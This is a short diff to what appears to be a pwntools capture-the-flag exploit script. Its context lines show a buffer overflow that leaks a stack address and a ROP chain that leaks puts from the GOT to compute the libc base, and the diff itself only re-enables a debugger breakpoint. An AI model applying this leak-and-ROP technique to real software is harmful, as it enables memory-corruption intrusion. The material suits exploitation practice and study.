@@ -13,8 +13,7 @@ io.sendafter(">", 'a' * 80)
 stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x70
 success("stack -> {:#x}".format(stack))
 
-
-#  DEBUG("b *0x4006B9\nc")
+DEBUG("b *0x4006B9\nc")
 io.sendafter(">", flat(['11111111', 0x400793, elf.got['puts'], elf.plt['puts'], 0x400676, (80 - 40) * '1', stack, 0x4006be]))
 libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - libc.sym['puts']
 success("libc.address -> {:#x}".format(libc.address))
